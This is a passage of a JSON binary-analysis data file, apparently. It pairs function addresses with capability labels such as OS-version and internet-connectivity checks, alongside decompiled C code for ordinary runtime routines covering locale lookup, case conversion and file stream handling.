        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h_2\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.00426b61(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint CodePage, uint noname_5, uint Locale, \n            uint LCType, uint lpLCData, uint cchData, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uchar *arg_8h;\n    int32_t unaff_EBP;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_4h;\n    uint uVar2;\n    uint uVar3;\n    uint var_28h;\n    uint var_24h_2;\n    uint var_20h_2;\n    uint var_34h;\n    uint uStack24;\n    uint uStack20;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    var_18h = 0x18;\n    var_1ch = 0x443bb0;\n    var_20h = 0x426b6d;\n    fcn.00419d14();\n    if (*0x450c4c == 0) {\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = 1;\n        uStack24 = 0;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        if (iVar1 == 0) {\n            var_20h = 0x426b96;\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar1 == 0x78) {\n                *0x450c4c = 2;\n            }\n        }\n        else {\n            *0x450c4c = 1;\n        }\n    }\n    if ((*0x450c4c == 2) || (*0x450c4c == 0)) {\n        var_20h = *(unaff_EBP + 0x14);\n        var_24h = *(unaff_EBP + 0x10);\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_GetLocaleInfoA)();\n    }\n    else if (*0x450c4c == 1) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + 0x18) == 0) {\n            *(unaff_EBP + 0x18) = *0x450bac;\n        }\n        var_20h = 0;\n        var_24h = 0;\n        uStack20 = *(unaff_EBP + 0xc);\n        uStack24 = *(unaff_EBP + 8);\n        arg_8h = &stack0xffffffe8;\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)();\n        *(unaff_EBP + -0x24) = iVar1;\n        if (iVar1 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.00418b80();\n            *(unaff_EBP + -0x18) = &stack0xffffffe8;\n            *(unaff_EBP + -0x28) = &stack0xffffffe8;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x18) {\n                arg_8h = fcn.004188ff(iVar1 * 2);\n                if (arg_8h == NULL) goto code_r0x00426c98;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLocaleInfoW)(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_8h, iVar1);\n            if (iVar1 != 0) {\n                if (*(unaff_EBP + 0x14) == 0) {\n                    uVar3 = 0;\n                    uVar2 = 0;\n                }\n                else {\n                    uVar3 = *(unaff_EBP + 0x14);\n                    uVar2 = *(unaff_EBP + 0x10);\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                                  (*(unaff_EBP + 0x18), 0, arg_8h, 0xffffffff, uVar2, uVar3, 0, 0);\n                *(unaff_EBP + -0x1c) = uVar3;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00418911(arg_8h);\n            }\n        }\n    }\ncode_r0x00426c98:\n    *(unaff_EBP + -0x38) = 0x426ca0;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1210
    },
    "00426e82": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426e82(code **param_1)\n\n{\n    code *pcVar1;\n    \n    *param_1 = vtable.std::ios_base.0;\n    if ((param_1[1] == NULL) ||\n       (pcVar1 = param_1[1] + 0x450c84,  *pcVar1 = *pcVar1 + -1,  param_1[1][0x450c84] < '\\x01')) {\n        fcn.00426e40();\n        pcVar1 = param_1[9];\n        if (pcVar1 != NULL) {\n            fcn.00426db5();\n            fcn.0042f834(pcVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "0042929a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042929a(code **param_1)\n\n{\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00418911(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "00427993": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427993(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    *(param_1 + 0x54) = param_3 == 1;\n    *(param_1 + 0x4c) = 0;\n    fcn.0042785a();\n    if (param_2 != 0) {\n        fcn.00427425(param_2 + 8, param_2, param_2 + 4, param_2 + 8, param_2, param_2 + 4);\n    }\n    *(param_1 + 0x58) = param_2;\n    *(param_1 + 0x50) = *0x450c98;\n    uVar1 = *0x450c98;\n    *(param_1 + 0x3c) = 0;\n    *(param_1 + 0x40) = uVar1;\n    return;\n}\n",
        "token_count": 223
    },
    "0042808a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid fcn.0042808a(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    iVar1 = extraout_ECX[0xf];\n    *(unaff_EBP + -0x10) = *0x44d270;\n    if ((iVar1 != 0) && (*(extraout_ECX + 0x13) != '\\0')) {\n        (**(*extraout_ECX + 4))(0xffffffff);\n        fcn.00428064(8, 0);\n        *(unaff_EBP + -4) = 0;\n        do {\n            iVar1 = *(unaff_EBP + -0x28);\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                iVar1 = unaff_EBP + -0x28;\n            }\n            iVar1 = (**(*extraout_ECX[0xf] + 0x18))\n                              (extraout_ECX + 0x14, iVar1, iVar1 + *(unaff_EBP + -0x18), unaff_EBP + -0x30);\n            if (iVar1 == 0) {\n                *(extraout_ECX + 0x13) = 0;\n            }\n            else if (iVar1 != 1) goto code_r0x00428153;\n            iVar1 = *(unaff_EBP + -0x28);\n            if (*(unaff_EBP + -0x14) < 0x10) {\n                iVar1 = unaff_EBP + -0x28;\n            }\n            iVar1 = *(unaff_EBP + -0x30) - iVar1;\n            if (iVar1 != 0) {\n                iVar2 = *(unaff_EBP + -0x28);\n                if (*(unaff_EBP + -0x14) < 0x10) {\n                    iVar2 = unaff_EBP + -0x28;\n                }\n                iVar2 = fcn.00429564(iVar2, iVar1, 1, extraout_ECX[0x16]);\n                if (iVar1 != iVar2) goto code_r0x00428153;\n            }\n            if (*(extraout_ECX + 0x13) == '\\0') goto code_r0x00428153;\n            fcn.00427e53(8, 0);\n        } while( true );\n    }\ncode_r0x00428166:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    fcn.004192ca();\n    return;\ncode_r0x00428153:\n    fcn.00401e00(1, 0);\n    goto code_r0x00428166;\n}\n",
        "token_count": 718
    },
    "00428557": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00428557(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::basic_filebuf_char__struct_std::char_traits_char__.0;\n    *(unaff_EBP + -4) = 0;\n    if (*(extraout_ECX + 0x15) != '\\0') {\n        fcn.0042850a();\n    }\n    if (extraout_ECX[0x12] != NULL) {\n        fcn.00427b8e(1);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00427676();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 238
    },
    "0042873f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042873f(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    if (*0x450da4 == NULL) {\n        fcn.00428e20(fcn.004286fc);\n    }\n    piVar1 = fcn.0042f804(8);\n    if (piVar1 == NULL) {\n        piVar1 = NULL;\n    }\n    else {\n        *piVar1 = *0x450da4;\n        piVar1[1] = param_1;\n    }\n    *0x450da4 = piVar1;\n    return;\n}\n",
        "token_count": 138
    },
    "00428a34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00428a34(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar2 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar3 = fcn.004240ec();\n        var_ch = *(iVar3 + 8);\n        iVar3 = fcn.004240d3();\n    }\n    else {\n        var_ch = *arg_ch;\n        iVar3 = arg_ch[1];\n    }\n    if (var_ch != 0) {\n        if (arg_8h < 0x100) {\n            if (piVar2 == NULL) {\n                iVar4 = fcn.0042146c(arg_8h);\n                if (iVar4 == 0) {\n                    return arg_8h;\n                }\n            }\n            else if ((*(piVar2[2] + arg_8h * 2) & 1) == 0) {\n                return arg_8h;\n            }\n        }\n        iVar4 = fcn.00421466();\n        uVar1 = arg_8h >> 8 & 0xff;\n        if ((*(iVar4 + 1 + uVar1 * 2) & 0x80) == 0) {\n            arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_ch._0_2_ = CONCAT11(arg_8h, uVar1);\n            arg_ch = arg_ch & 0xff000000 | arg_ch;\n            noname_3 = 2;\n        }\n        iVar3 = fcn.00420e28(var_ch, 0x100, &arg_ch, noname_3, &var_4h, 3, iVar3, 1, unaff_EDI, unaff_EBX, unaff_ESI, \n                             iVar3, var_ch, arg_8h >> 8, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, \n                             in_stack_0000000c, in_stack_00000010, in_stack_00000014, in_stack_00000018, \n                             in_stack_0000001c, in_stack_00000020, in_stack_00000024, in_stack_00000028);\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                arg_8h = var_4h & 0xff;\n            }\n            else {\n                arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n            }\n        }\n        return arg_8h;\n    }\n    if (arg_8h < 0x41) {\n        return arg_8h;\n    }\n    if (0x5a < arg_8h) {\n        return arg_8h;\n    }\n    return arg_8h + 0x20;\n}\n",
        "token_count": 897
    },
    "00428bcb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00428bcb(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0042032b();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0041c65e(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00428c77": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00428c77(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0042032b();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0041c65e(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00428c94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00428c94(uint32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t noname_6;\n    int32_t iVar4;\n    uint noname_3;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    bool bVar5;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    piVar2 = arg_ch;\n    if (arg_ch == NULL) {\n        iVar3 = fcn.004240ec();\n        iVar3 = *(iVar3 + 8);\n        noname_6 = fcn.004240d3();\n    }\n    else {\n        iVar3 = *arg_ch;\n        noname_6 = arg_ch[1];\n    }\n    if (iVar3 == 0) {\n        if ((0x60 < arg_8h) && (arg_8h < 0x7b)) {\n            arg_8h = arg_8h - 0x20;\n        }\n    }\n    else {\n        if (arg_8h < 0x100) {\n            if (piVar2 == NULL) {\n                iVar4 = fcn.004214a6(arg_8h);\n                bVar5 = iVar4 == 0;\n            }\n            else {\n                bVar5 = (*(piVar2[2] + arg_8h * 2) & 2) == 0;\n            }\n            if (bVar5) {\n                return arg_8h;\n            }\n        }\n        iVar4 = fcn.00421466();\n        uVar1 = arg_8h >> 8 & 0xff;\n        if ((*(iVar4 + 1 + uVar1 * 2) & 0x80) == 0) {\n            arg_ch = arg_ch & 0xffff0000 | arg_8h & 0xff;\n            noname_3 = 1;\n        }\n        else {\n            arg_ch._0_2_ = CONCAT11(arg_8h, uVar1);\n            arg_ch = arg_ch & 0xff000000 | arg_ch;\n            noname_3 = 2;\n        }\n        iVar3 = fcn.00420e28(iVar3, 0x200, &arg_ch, noname_3, &var_4h, 3, noname_6, 1, unaff_EBX, unaff_EDI, unaff_ESI, \n                             noname_6, arg_8h >> 8, var_4h, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, in_stack_0000000c\n                             , in_stack_00000010, in_stack_00000014, in_stack_00000018, in_stack_0000001c, \n                             in_stack_00000020, in_stack_00000024, in_stack_00000028, in_stack_0000002c);\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                arg_8h = var_4h & 0xff;\n            }\n            else {\n                arg_8h = CONCAT11(var_4h, var_4h._1_1_);\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 907
    },
    "00428e03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00428e03(void)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        uVar1 = fcn.0042032b();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar1);\n    }\n    else {\n        fcn.0041c65e(0xc);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00429331": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00429331(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x444638, 0x10);\n    *(unaff_EBP + -0x1c) = 0;\n    uVar1 = *(unaff_EBP + 0x10);\n    if ((uVar1 != 4) &&\n       (((*(unaff_EBP + 0x14) < 2 || (0x7fffffff < *(unaff_EBP + 0x14))) || ((uVar1 != 0 && (uVar1 != 0x40))))))\n    goto code_r0x004293fd;\n    *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) & 0xfffffffe;\n    piVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = piVar2;\n    fcn.0041c46a(piVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.00421c50(piVar2);\n    fcn.0042612b(piVar2);\n    *(piVar2 + 3) = *(piVar2 + 3) & 0xc2f3;\n    if ((uVar1 & 4) == 0) {\n        piVar3 = *(unaff_EBP + 0xc);\n        if (piVar3 != NULL) {\n            piVar2[3] = piVar2[3] | 0x500;\n            goto code_r0x004293e3;\n        }\n        piVar3 = fcn.004188ff(*(unaff_EBP + 0x14));\n        *(unaff_EBP + 0xc) = piVar3;\n        if (piVar3 != NULL) {\n            *(piVar2 + 3) = *(piVar2 + 3) | 0x408;\n            goto code_r0x004293e3;\n        }\n        *0x4507e0 = *0x4507e0 + 1;\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\n    else {\n        piVar2[3] = piVar2[3] | 4;\n        piVar3 = piVar2 + 5;\n        *(unaff_EBP + 0xc) = piVar3;\n        *(unaff_EBP + 0x14) = 2;\ncode_r0x004293e3:\n        piVar2[6] = *(unaff_EBP + 0x14);\n        piVar2[2] = piVar3;\n        *piVar2 = piVar3;\n        piVar2[1] = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00429403();\ncode_r0x004293fd:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 742
    },
    "0042945d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042945d(char *arg_8h, uint32_t arg_ch, uint32_t arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = arg_ch * arg_10h;\n    if (uVar3 == 0) {\n        arg_10h = 0;\n    }\n    else {\n        uVar2 = uVar3;\n        if ((*(arg_14h + 3) & 0x10c) == 0) {\n            var_4h = 0x1000;\n        }\n        else {\n            var_4h = arg_14h[6];\n        }\n        do {\n            if (((arg_14h[3] & 0x108U) == 0) || (uVar4 = arg_14h[1],  uVar4 == 0)) {\n                if (var_4h <= uVar2) {\n                    if (((arg_14h[3] & 0x108U) != 0) && (iVar1 = fcn.00421c50(arg_14h),  iVar1 != 0)) {\ncode_r0x00429552:\n                        return (uVar3 - uVar2) / arg_ch;\n                    }\n                    uVar4 = uVar2;\n                    if (var_4h != 0) {\n                        uVar4 = uVar2 - uVar2 % var_4h;\n                    }\n                    arg_10h_00 = fcn.00421a15(arg_14h[4], arg_8h, uVar4);\n                    if ((arg_10h_00 == 0xffffffff) || (uVar2 = uVar2 - arg_10h_00,  arg_10h_00 < uVar4)) {\n                        arg_14h[3] = arg_14h[3] | 0x20;\n                        goto code_r0x00429552;\n                    }\n                    goto code_r0x00429512;\n                }\n                iVar1 = fcn.0041b998(*arg_8h, arg_14h);\n                if (iVar1 == -1) goto code_r0x00429552;\n                arg_8h = arg_8h + 1;\n                var_4h = arg_14h[6];\n                uVar2 = uVar2 - 1;\n                if (var_4h < 1) {\n                    var_4h = 1;\n                }\n            }\n            else {\n                arg_10h_00 = uVar2;\n                if (uVar4 <= uVar2) {\n                    arg_10h_00 = uVar4;\n                }\n                fcn.00419370(*arg_14h, arg_8h, arg_10h_00);\n                arg_14h[1] = arg_14h[1] - arg_10h_00;\n                *arg_14h = *arg_14h + arg_10h_00;\n                uVar2 = uVar2 - arg_10h_00;\ncode_r0x00429512:\n                arg_8h = arg_8h + arg_10h_00;\n            }\n        } while (uVar2 != 0);\n    }\n    return arg_10h;\n}\n",
        "token_count": 777
    },
    "0042962a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0042962a(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    if (((*(param_1 + 0xc) & 0x83) == 0) || (((param_3 != 0 && (param_3 != 1)) && (param_3 != 2)))) {\n        puVar3 = fcn.0041a92a();\n        *puVar3 = 0x16;\n        iVar2 = -1;\n    }\n    else {\n        *(param_1 + 0xc) = *(param_1 + 0xc) & 0xffffffef;\n        if (param_3 == 1) {\n            iVar2 = fcn.004298f6(param_1);\n            param_2 = param_2 + iVar2;\n            param_3 = 0;\n        }\n        fcn.00421c50(param_1);\n        uVar1 = *(param_1 + 0xc);\n        if (uVar1 < '\\0') {\n            *(param_1 + 0xc) = uVar1 & 0xfffffffc;\n        }\n        else if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {\n            *(param_1 + 0x18) = 0x200;\n        }\n        iVar2 = fcn.0042179c(*(param_1 + 0x10), param_2, param_3);\n        iVar2 = (iVar2 != -1) - 1;\n    }\n    return iVar2;\n}\n",
        "token_count": 390
    },
    "004298f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004298f6(char **arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    char **ppcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppcVar4 = arg_8h;\n    pcVar7 = arg_8h[4];\n    if (arg_8h[1] < 0) {\n        arg_8h[1] = NULL;\n    }\n    var_4h = fcn.0042179c(pcVar7, 0, 1);\n    if (var_4h < 0) {\ncode_r0x00429993:\n        var_8h = -1;\n    }\n    else {\n        pcVar8 = arg_8h[3];\n        if ((pcVar8 & 0x108) == 0) {\n            return var_4h - arg_8h[1];\n        }\n        pcVar9 = *arg_8h;\n        pcVar2 = arg_8h[2];\n        var_8h = pcVar9 - pcVar2;\n        if ((pcVar8 & 3) == 0) {\n            if (-1 < pcVar8) {\n                puVar5 = fcn.0041a92a();\n                *puVar5 = 0x16;\n                goto code_r0x00429993;\n            }\n        }\n        else if (((*(*((pcVar7 >> 5) * 4 + 0x450ea0) + 4 + (pcVar7 & 0x1f) * 0x24) & 0x80) != 0) &&\n                (pcVar8 = pcVar2,  pcVar2 < pcVar9)) {\n            do {\n                if (*pcVar8 == '\\n') {\n                    var_8h = var_8h + 1;\n                }\n                pcVar8 = pcVar8 + 1;\n            } while (pcVar8 < *arg_8h);\n        }\n        if (var_4h != 0) {\n            if ((*(arg_8h + 3) & 1) != 0) {\n                if (arg_8h[1] == NULL) {\n                    var_8h = 0;\n                }\n                else {\n                    pcVar8 = arg_8h[1] + (pcVar9 - pcVar2);\n                    piVar1 = (pcVar7 >> 5) * 4 + 0x450ea0;\n                    iVar10 = (pcVar7 & 0x1f) * 0x24;\n                    if ((*(iVar10 + 4 + *piVar1) & 0x80) != 0) {\n                        iVar6 = fcn.0042179c(pcVar7, 0, 2);\n                        if (iVar6 == var_4h) {\n                            pcVar7 = arg_8h[2];\n                            pcVar9 = pcVar8 + pcVar7;\n                            arg_8h = pcVar8;\n                            for (; pcVar7 < pcVar9; pcVar7 = pcVar7 + 1) {\n                                if (*pcVar7 == '\\n') {\n                                    arg_8h = arg_8h + 1;\n                                }\n                            }\n                            uVar3 = *(ppcVar4 + 0xd) & 0x20;\n                        }\n                        else {\n                            fcn.0042179c(pcVar7, 